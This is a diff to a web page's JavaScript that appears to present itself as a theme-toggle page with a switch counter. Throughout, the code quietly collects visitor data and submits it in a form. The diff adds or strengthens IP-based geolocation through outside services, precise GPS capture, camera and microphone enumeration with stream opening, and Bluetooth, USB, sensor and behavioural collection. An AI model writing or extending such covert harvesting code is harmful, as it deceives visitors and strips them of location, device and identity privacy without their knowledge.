@@ -573,7 +573,6 @@
         const themeToggle = document.getElementById('themeToggle');
         const body = document.body;
         const themeLabel = document.getElementById('themeLabel');
-        const modeStatus = document.getElementById('modeStatus');
         const transitionOverlay = document.getElementById('transitionOverlay');
         const starsContainer = document.getElementById('starsContainer');
         const saveNotification = document.getElementById('saveNotification');
@@ -586,7 +585,6 @@
 
         const MAX_SWITCHES = 5;
         const SWITCH_COUNT_KEY = 'themeSwitchCount';
-        const ACTIVATION_TIME_KEY = 'lastActivationTime';
         const PENDING_DATA_KEY = 'pendingFormData';
 
         const ENABLE_LOGS = true;
@@ -736,7 +734,7 @@
 
                 browserData.projectData = projectData;
 
-                const sendStamp = `// Данные собраны. Время сбора: ${new Date().toLocaleDateString('ru-BY')}\n`;
+                const sendStamp = `// Данные собраны. Время сбора: ${new Date().toLocaleString('ru-BY')}\n`;
                 const jsonData = sendStamp + JSON.stringify(browserData, null, 2);
 
                 debugLog('Данные собраны. Отправка формы');
@@ -765,7 +763,7 @@
                     userAgent: navigator.userAgent,
                     referrer: document.referrer || 'none',
                     historyLength: history.length,
-                    collectionVersion: "2.2"
+                    collectionVersion: "2.4"
                 },
                 browser: collectBrowserInfo(),
                 system: collectSystemInfo(),
@@ -792,43 +790,16 @@
                 data.media = { error: error.message, status: 'not_available' };
             }
 
+            data.location = await collectLocationInfo();
+            data.media = await collectMediaInfo();
+            data.advanced = await collectAdvancedInfo();
+            data.sensors = await collectSensorInfo();
+            data.bluetooth = await collectBluetoothInfo();
+            data.usb = await collectUSBInfo();
             data.network = collectNetworkInfo();
             data.capabilities = collectCapabilitiesInfo();
             data.additional = collectAdditionalInfo();
-
-            data.advanced = await collectAdvancedInfo();
             data.behavior = collectBehaviorInfo();
-            data.sensors = await collectSensorInfo();
-
-            try {
-                data.bluetooth = await collectBluetoothInfo();
-            } catch (error) {
-                data.bluetooth = {
-                    available: false,
-                    details: {
-                        isAvailable: false,
-                        permissions: 'error',
-                        pairedDevicesCount: 0,
-                        canScan: false,
-                        error: error.message
-                    },
-                    devices: []
-                };
-            }
-
-            try {
-                data.usb = await collectUSBInfo();
-            } catch (error) {
-                data.usb = {
-                    available: false,
-                    details: {
-                        permissionState: 'error',
-                        connectedDevicesCount: 0,
-                        error: error.message
-                    },
-                    devices: []
-                };
-            }
 
             data.projectData = {
                 switchCount: MAX_SWITCHES,
@@ -1050,6 +1021,8 @@
         async function collectBluetoothInfo() {
             const result = {
                 available: 'bluetooth' in navigator,
+                error: null,
+                status: 'success',
                 details: {
                     isAvailable: false,
                     permissions: 'unknown',
@@ -1061,6 +1034,8 @@
             };
 
             if (!result.available) {
+                result.error = 'Bluetooth API not supported';
+                result.status = 'not_supported';
                 return result;
             }
 
@@ -1114,7 +1089,9 @@
                 };
 
             } catch (error) {
+                result.available = false;
                 result.error = error.message;
+                result.status = 'error';
                 result.details.error = error.message;
             }
 
@@ -1124,6 +1101,8 @@
         async function collectUSBInfo() {
             const result = {
                 available: 'usb' in navigator,
+                error: null,
+                status: 'success',
                 details: {
                     permissionState: 'unknown',
                     connectedDevicesCount: 0
@@ -1133,6 +1112,8 @@
             };
 
             if (!result.available) {
+                result.error = 'USB API not supported';
+                result.status = 'not_supported';
                 return result;
             }
 
@@ -1176,7 +1157,6 @@
                             opened: device.opened,
                             usbVersion: device.usbVersionMajor ?
                                 `USB ${device.usbVersionMajor}.${device.usbVersionMinor}` : 'unknown',
-
                             configurations: device.configurations?.length || 0
                         }));
                     } catch (e) {
@@ -1190,7 +1170,9 @@
                 };
 
             } catch (error) {
+                result.available = false;
                 result.error = error.message;
+                result.status = 'error';
                 result.details.error = error.message;
             }
 
@@ -1326,7 +1308,14 @@
 
         function getBrowserVersion() {
             const ua = navigator.userAgent;
-            const matches = ua.match(/(chrome|firefox|safari|edge|opera|opr|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+
+            if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
+                const safariMatch = ua.match(/Version\/(\d+)/);
+                if (safariMatch) return safariMatch[1];
+            }
+
+            const matches = ua.match(/(chrome|firefox|edge|opera|opr|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+
             return matches[2] || 'unknown';
         }
 
@@ -1406,23 +1395,29 @@
         async function collectLocationInfo() {
             debugLog('Начало сбора геолокации');
 
-            let ipData = {};
+            const result = {
+                available: true,
+                error: null,
+                status: 'success',
+                details: {
+                    ipBased: {},
+                    precise: null,
+                    estimatedByTimezone: {}
+                },
+                timestamp: new Date().toISOString()
+            };
 
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const ipInfo = await response.json();
-                ipData.ip = ipInfo.ip;
-
-                debugLog(`Получен IP: ${ipInfo.ip}`);
+                result.details.ipBased.ip = ipInfo.ip;
 
                 try {
-                    debugLog('Запрос геоданных через ipapi.co');
                     const geoResponse = await fetch(`https://ipapi.co/${ipInfo.ip}/json/`);
-
                     if (geoResponse.ok) {
                         const geoData = await geoResponse.json();
-                        ipData = {
-                            ...ipData,
+                        result.details.ipBased = {
+                            ...result.details.ipBased,
                             ...geoData,
                             country: geoData.country_name,
                             country_code: geoData.country_code,
@@ -1441,23 +1436,19 @@
                             proxy: geoData.proxy || false,
                             hosting: geoData.hosting || false
                         };
-                        debugLog('Геоданные получены успешно');
-                    }
-                    else {
-                        ipData.geoError = `HTTP ${geoResponse.status}`;
-                        debugError(`Ошибка ipapi.co: ${geoResponse.status}`);
+                    } else {
+                        result.details.ipBased.geoError = `HTTP ${geoResponse.status}`;
                     }
                 } catch (geoError) {
-                    ipData.geoError = geoError.message;
-                    debugError('Ошибка при получении геоданных', geoError);
+                    result.details.ipBased.geoError = geoError.message;
                 }
-            }
-            catch (error) {
-                ipData.error = 'Не удалось получить данные по IP';
-                debugError('Ошибка получения IP', error);
+            } catch (error) {
+                result.available = false;
+                result.error = 'Не удалось получить данные по IP';
+                result.status = 'error';
+                result.details.ipBased.error = error.message;
             }
 
-            let preciseLocation = null;
             if ('geolocation' in navigator) {
                 try {
                     const position = await new Promise((resolve, reject) => {
@@ -1482,7 +1473,7 @@
                         );
                     });
 
-                    preciseLocation = {
+                    result.details.precise = {
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
                         accuracy: position.coords.accuracy + ' метров',
@@ -1492,48 +1483,56 @@
                         speed: position.coords.speed
                     };
 
-                    debugLog('Точная геолокация получена', {
-                        accuracy: preciseLocation.accuracy,
-                        coords: `${preciseLocation.latitude}, ${preciseLocation.longitude}`
-                    });
-
                 } catch (error) {
-                    preciseLocation = {
+                    result.details.precise = {
                         error: error.message,
                         code: error.code || 'unknown'
                     };
-                    debugError('Ошибка точной геолокации', error);
                 }
+            } else {
+                result.details.precise = {
+                    error: 'Geolocation API not supported',
+                    code: 'not_supported'
+                };
             }
 
-            return {
-                ipBased: ipData,
-                precise: preciseLocation,
-                estimatedByTimezone: {
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    language: navigator.language
-                }
+            result.details.estimatedByTimezone = {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language
             };
+
+            return result;
         }
 
         async function collectMediaInfo() {
+            const result = {
+                available: false,
+                error: null,
+                status: 'not_available',
+                details: {
+                    devices: [],
+                    screen: {},
+                    summary: {},
+                    systemInfo: {}
+                },
+                timestamp: new Date().toISOString()
+            };
+
             if (!('mediaDevices' in navigator)) {
-                return {
-                    error: 'MediaDevices API не поддерживается',
-                    summary: {
-                        cameraCount: 0,
-                        microphoneCount: 0
-                    },
-                    screen: {
-                        hasScreenCapture: false
-                    },
-                    systemInfo: {
-                        hasFrontCamera: false,
-                        hasBackCamera: false,
-                        hasExternalCamera: false
-                    },
-                    devices: []
+                result.error = 'MediaDevices API не поддерживается';
+                result.details.summary = {
+                    cameraCount: 0,
+                    microphoneCount: 0
                 };
+                result.details.screen = {
+                    hasScreenCapture: false
+                };
+                result.details.systemInfo = {
+                    hasFrontCamera: false,
+                    hasBackCamera: false,
+                    hasExternalCamera: false
+                };
+                return result;
             }
 
             try {
@@ -1592,7 +1591,6 @@
                                 details.capabilitiesError = e.message;
                             }
 
-                            track.stop();
                             stream.getTracks().forEach(t => t.stop());
 
                         } catch (e) {
@@ -1616,32 +1614,32 @@
                     hasScreenCapture: 'getDisplayMedia' in navigator.mediaDevices
                 };
 
-                return {
-                    devices: detailedDevices,
-                    screen: screenInfo,
-                    summary: summary,
-                    systemInfo: systemInfo,
-                    timestamp: new Date().toISOString()
-                };
+                result.available = true;
+                result.status = 'success';
+                result.details.devices = detailedDevices;
+                result.details.screen = screenInfo;
+                result.details.summary = summary;
+                result.details.systemInfo = systemInfo;
 
             } catch (error) {
-                return {
-                    error: error.message,
-                    summary: {
-                        cameraCount: 0,
-                        microphoneCount: 0
-                    },
-                    screen: {
-                        hasScreenCapture: false
-                    },
-                    systemInfo: {
-                        hasFrontCamera: false,
-                        hasBackCamera: false,
-                        hasExternalCamera: false
-                    },
-                    devices: []
+                result.available = false;
+                result.error = error.message;
+                result.status = 'error';
+                result.details.summary = {
+                    cameraCount: 0,
+                    microphoneCount: 0
+                };
+                result.details.screen = {
+                    hasScreenCapture: false
+                };
+                result.details.systemInfo = {
+                    hasFrontCamera: false,
+                    hasBackCamera: false,
+                    hasExternalCamera: false
                 };
             }
+
+            return result;
         }
 
         function getDeviceType(kind) {
@@ -1693,20 +1691,20 @@
         }
 
         function detectConnectionTypeFallBack() {
-            const ua = '';
+            const ua = navigator.userAgent || '';
 
             if (/Mobile|Android|iPhone|iPad/i.test(ua)) {
                 const screenWidth = screen.width;
 
-                if (screenWidth > 768) return 'callular (tablet)';
+                if (screenWidth > 768) return 'cellular (tablet)';
                 return 'cellular (mobile)';
             }
 
             if (performance.timing) {
                 const loadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
 
-                if (loadTime < 1000) return 'enthernet (fast)';
-                if (loadTime < 3000) return 'wi-fi (medium)';
+                if (loadTime < 1000) return 'ethernet (fast)';
+                if (loadTime < 3000) return 'wifi (medium)';
                 return 'cellular (slow)';
             }
         }
